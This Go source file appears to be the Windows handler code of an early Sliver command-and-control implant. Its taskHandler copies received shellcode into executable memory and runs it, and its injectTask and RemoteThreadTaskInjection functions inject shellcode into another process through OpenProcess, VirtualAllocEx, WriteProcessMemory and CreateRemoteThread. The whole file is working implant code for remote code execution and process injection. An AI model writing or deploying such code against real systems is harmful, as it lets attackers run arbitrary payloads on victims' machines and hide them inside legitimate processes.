package main

import (
	"log"
	pb "sliver/protobuf"
	"syscall"
	"unsafe"

	"github.com/golang/protobuf/proto"
)

var (
	windowsHandlers = map[string]interface{}{
		"task":       taskHandler,
		"remoteTask": remoteTaskHandler,
	}
)

func getSystemHandlers() map[string]interface{} {
	return windowsHandlers
}

// ---------------- Handlers ----------------
func taskHandler(data []byte) {

	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		log.Printf("Error decoding message: %v", err)
		return
	}

	size := len(task.Data)
	addr, _ := sysAlloc(size)
	buf := (*[9999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = task.Data[index]
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
	return
}

func remoteTaskHandler(data []byte) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		log.Printf("Error decoding message: %v", err)
		return
	}

}

// ---------------- Platform Code ----------------

const (
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x000040
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	openProcess        = kernel32.MustFindProc("OpenProcess")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	createThread       = kernel32.MustFindProc("CreateThread")
)

type Handle uintptr

func sysAlloc(size int) (uintptr, error) {
	n := uintptr(size)
	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle Handle, data []byte) error {

	// Create native buffer with the shellcode
	dataSize := len(data)
	log.Println("[*] creating native data buffer ...")
	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if dataAddr == 0 {
		return err
	}
	dataBuf := (*[9999]byte)(unsafe.Pointer(dataAddr))
	for index, value := range data {
		dataBuf[index] = value
	}

	// Remotely allocate memory in the target process
	log.Println("[*] allocating remote process memory ...")
	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	log.Printf("[*] virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	if remoteAddr == 0 {
		log.Println("[!] failed to allocate remote process memory")
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(dataAddr), ptr(dataSize), 0)
	log.Printf("[*] writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
	if writeMemorySuccess == 0 {
		log.Printf("[!] failed to write data into remote process")
		return err
	}

	// Create the remote thread to where we wrote the shellcode
	log.Println("[*] successfully injected data, starting remote thread ....")
	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
	log.Printf("[*] createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
	if createThreadSuccess == 0 {
		log.Printf("[!] failed to create remote thread")
		return err
	}
	return nil
}

// OpenProcessHandle - Returns the handle for a given process id
func OpenProcessHandle(processID int) (Handle, error) {
	log.Println("[*] obtaining process handle for pid ...")
	handle, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(processID))
	log.Printf("[*] openprocess returned: handle = %v, err = %v", handle, err)
	if handle == 0 {
		log.Println("[!] failed to obtain process handle")
		return 0, err
	}
	return Handle(handle), nil
}

// RemoteThreadTaskInjection - Injects Task into a processID using remote threads
func RemoteThreadTaskInjection(processID int, data []byte) error {
	processHandle, err := OpenProcessHandle(processID)
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data)
	if err != nil {
		return err
	}
	return nil
}
